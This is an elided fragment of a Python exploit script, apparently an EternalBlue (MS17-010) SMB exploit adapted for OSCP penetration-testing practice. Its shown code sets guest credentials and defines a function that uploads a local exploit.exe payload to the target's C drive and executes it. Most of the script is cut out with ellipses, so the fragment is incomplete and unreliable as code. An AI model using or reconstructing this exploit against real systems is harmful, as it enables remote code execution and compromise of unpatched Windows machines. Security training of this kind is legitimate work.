#THIS IS NOT MY EXPLOIT AND I TAKE NO CREDIT IN CLAIMING IT AS MY OWN, BECAUSE IT ISN'T
#PURELY USED FOR OSCP FOR MANUAL EXPLOIT OF ETERNEL BLUE EXPLOIT
...
#Change these if guest permitted (eg. USERNAME='guest' PASSWORD=''
USERNAME = ''
PASSWORD = ''
...
def smb_pwn(conn, arch):
	...
	print('Sending exploit.exe to target...')
	smb_send_file(smbConn, '/home/muzz/OSCP/exploit.exe', 'C', '/exploit.exe')
	print('Executing exploit.exe...')
